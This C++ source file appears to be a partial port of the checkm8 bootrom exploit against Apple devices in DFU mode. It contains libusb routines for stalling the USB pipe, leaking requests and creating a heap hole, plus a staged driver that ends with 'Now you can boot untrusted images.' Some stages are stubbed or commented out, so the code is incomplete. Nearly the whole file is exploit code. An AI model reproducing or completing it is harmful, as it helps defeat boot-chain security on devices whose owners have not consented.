#include "checkm8.h"
#include "Dfu.h"
#include "Libusb.h"
#include <stdio.h>
#include <stdint.h>

#define USB_MAX_STRING_DESCRIPTOR_IDX 10
#define EP0_MAX_PACKET_SZ 0x40
#define DFU_FILE_SUFFIX_LEN 16

enum class Stage : int32_t
{
	kReset,
	kSpray,
	kSetup,
	kPatch,
	kPwned
};

namespace Checkm8
{
	int Reset(LibUsb::UsbDesc* pDesc)
	{/*
		LibUsb::TransferDesc transferDesc;
		if (LibUsb::SendControlRequestWnoData(
			pDesc,
			0x21,
			DFU_DOWNLOAD,
			0,
			0,
			DFU_FILE_SUFFIX_LEN,
			&transferDesc)
			&& transferDesc.m_result == LIBUSB_TRANSFER_COMPLETED
			&& transferDesc.m_sz == DFU_FILE_SUFFIX_LEN
			)
		{

		}
		*/
		return 0;
	}

	int Stall(LibUsb::UsbDesc* pDesc)
	{
		/*
		Use asynchronous execution of a request with a minimum timeout.
		if we are lucky, the request will be canceled on the OS level 
		and remain in the execution queue, and the transaction won't be complete
		*/
		unsigned abortTimeout = 0;
		LibUsb::TransferDesc transferDesc;
		uint16_t wLength = 3 * EP0_MAX_PACKET_SZ; //0xC0
		while (SendControlRequestAsyncWnoData(pDesc, LIBUSB_ENDPOINT_IN | LIBUSB_REQUEST_TYPE_STANDARD | LIBUSB_RECIPIENT_DEVICE, LIBUSB_REQUEST_GET_DESCRIPTOR, (3U << 8U) | LibUsb::g_usbDeviceDescriptor.m_iSerialNumber, USB_MAX_STRING_DESCRIPTOR_IDX, wLength, abortTimeout, &transferDesc))
		{
			if (transferDesc.m_sz < wLength 
				//In packet ? 
				&& SendControlRequestAsyncWnoData(pDesc, 
					LIBUSB_ENDPOINT_IN | LIBUSB_REQUEST_TYPE_STANDARD | LIBUSB_RECIPIENT_DEVICE, 
					LIBUSB_REQUEST_GET_DESCRIPTOR, 
					(3U << 8U) | LibUsb::g_usbDeviceDescriptor.m_iSerialNumber, 
					USB_MAX_STRING_DESCRIPTOR_IDX,														
					EP0_MAX_PACKET_SZ,																	//0x40
					1,																					//timeout
					&transferDesc)
				&& transferDesc.m_sz == 0)
			{
				return true;
			}
			abortTimeout = (abortTimeout + 1) % LibUsb::g_usbTimeout;
		}
		return false;
	}

	int SprayStage(LibUsb::UsbDesc* pDesc)
	{
		if (LibUsb::g_devConfig.m_cfgLargeLeak == 0)
		{
			if (!Stall(pDesc))
			{
				return 0;
			}
			for (int i = 0; i < LibUsb::g_devConfig.m_cfgHole; i++)
			{
				if (!NoLeak(pDesc))
				{
					return 0;
				}
			}
			if (!UsbRequestLeak(pDesc) || !NoLeak(pDesc))
			{
				return 0;
			}
		}
		else
		{
			if (!UsbRequestStall(pDesc))
			{
				puts("\x1b[31m[-] Failed to stall pipe.\x1b[39m\n");
				return 0;
			}
			for (int i = 0; i < LibUsb::g_devConfig.m_cfgLargeLeak; i++)
			{
				if (!UsbRequestLeak(pDesc))
				{
					return 0;
				}
			}
			if (!UsbRequestNoLeak(pDesc))
			{
				puts("\x1b[31m[-] Failed to create heap hole.\x1b[39m\n");
				return 0;
			}
#ifdef _DEBUG
			puts("[!] Heap hole created");
#endif
		}
		return 1;
	}

	int NoLeak(LibUsb::UsbDesc* pDesc)
	{
		LibUsb::TransferDesc transferDesc;
		uint16_t wLength = 3 * EP0_MAX_PACKET_SZ + 1;
		return LibUsb::SendControlRequestAsyncWnoData(
			pDesc, 
			LIBUSB_ENDPOINT_IN | LIBUSB_REQUEST_TYPE_STANDARD | LIBUSB_RECIPIENT_DEVICE,
			LIBUSB_REQUEST_GET_DESCRIPTOR,
			(3U << 8U) | LibUsb::g_usbDeviceDescriptor.m_iSerialNumber, 
			USB_MAX_STRING_DESCRIPTOR_IDX, 
			wLength, 
			1, 
			&transferDesc) && transferDesc.m_sz == 0;
	}

	int UsbRequestLeak(LibUsb::UsbDesc* pDesc)
	{
		LibUsb::TransferDesc tDesc;

		return LibUsb::SendControlRequestAsyncWnoData(
			pDesc, 
			LIBUSB_ENDPOINT_IN | LIBUSB_REQUEST_TYPE_STANDARD | LIBUSB_RECIPIENT_DEVICE,	//requestType
			LIBUSB_REQUEST_GET_DESCRIPTOR,													//bRequest
			(3U << 8U) | LibUsb::g_usbDeviceDescriptor.m_iSerialNumber,						//USB_DT_STRING
			USB_MAX_STRING_DESCRIPTOR_IDX,													//wIndex
			EP0_MAX_PACKET_SZ,																//wLength
			1,																				//abortTimeout
			&tDesc) && tDesc.m_sz == 0;

	}

	int UsbRequestNoLeak(LibUsb::UsbDesc* pDesc)
	{
		LibUsb::TransferDesc tDesc;

		return SendControlRequestAsyncWnoData(
			pDesc,
			LIBUSB_ENDPOINT_IN | LIBUSB_REQUEST_TYPE_STANDARD | LIBUSB_RECIPIENT_DEVICE,	//requestType
			LIBUSB_REQUEST_GET_DESCRIPTOR,													//bRequest
			(3U << 8U) | LibUsb::g_usbDeviceDescriptor.m_iSerialNumber,						//USB_DT_STRING
			USB_MAX_STRING_DESCRIPTOR_IDX,													//wIndex
			EP0_MAX_PACKET_SZ + 1,															//wLength = 0x41
			1,																				//abortTimeout
			&tDesc) && tDesc.m_sz == 0;
	}

	int UsbRequestStall(LibUsb::UsbDesc* pDesc)
	{
		LibUsb::TransferDesc tDesc;
		//Synchronous request	
		return SendControlRequestWnoData(
			pDesc,  
			LIBUSB_ENDPOINT_OUT | LIBUSB_REQUEST_TYPE_STANDARD | LIBUSB_RECIPIENT_ENDPOINT,	//requestType
			LIBUSB_REQUEST_SET_FEATURE,														//bRequest
			0,																				//wValue
			0x80,																			//wIndex
			0,																				//wLength
			&tDesc) 
			&& tDesc.m_result == LIBUSB_TRANSFER_STALL;
	}

	void RunTest()
	{
		LibUsb::UsbDesc desc;
		int ret = LibUsb::Init(&desc);
		//libusb_set_debug(desc.m_usbCtxt, 3);
		if (ret == 0)
		{
			bool hasAlreadyBeenPwn3d = false;
			bool bAlreadyBeenFound = false;
			Stage stage = Stage::kReset;
			//	while (stage != Stage::kPwned && WaitForUsb(&desc, 0, 0, hasAlreadyBeenPwn3d, bAlreadyBeenFound) )
			WaitForUsb(&desc, 0, 0, hasAlreadyBeenPwn3d, bAlreadyBeenFound);
			while (stage != Stage::kPwned)
			{
				if (hasAlreadyBeenPwn3d == false)
				{
					switch (stage)
					{
					case(Stage::kReset):
					{
						bAlreadyBeenFound = true;
						puts("[+] Stage Reset");
						if (LibUsb::g_devConfig.m_cpid == 0x7000 || LibUsb::g_devConfig.m_cpid == 0x7001 || LibUsb::g_devConfig.m_cpid == 0x8000 || LibUsb::g_devConfig.m_cpid == 0x8003)
						{
							stage = Stage::kSetup;
						}
						else
						{
							stage = Stage::kSpray;
						}
						break;
					}
					case(Stage::kSpray):
					{
						if (IsDeviceStillConnected(&desc))
						{
							puts("[+] Stage Spray");
							stage = Stage::kSetup;
						}
						else
						{
							puts("[-] Device Disconnected");
							puts("[!] Quitting...");
						}
						break;
					}
					case(Stage::kSetup):
					{
						puts("[+] Stage Setup");
						if (IsDeviceStillConnected(&desc))
						{
							stage = Stage::kPatch;
						}
						else
						{
							puts("[-] Device Disconnected");
							puts("[!] Quitting...");
						}
						break;
					}
					case(Stage::kPatch):
					{
						puts("[+] Stage Patch");
						if (IsDeviceStillConnected(&desc))
						{
							stage = Stage::kPwned;
						}
						else
						{
							puts("[-] Device Disconnected");
							puts("[!] Quitting...");
						}
						break;
					}
					default:
					{
						IsDeviceStillConnected(&desc);
						puts("[+] Stage Unknown");
						puts("[!] Quitting...");
						stage = Stage::kPwned;
						break;
					}
					}
				}
				else
				{
					puts("[!] Now you can boot untrusted images.");
					stage = Stage::kPwned;
				}
			}
			Shutdown(&desc);
		}
	}

}

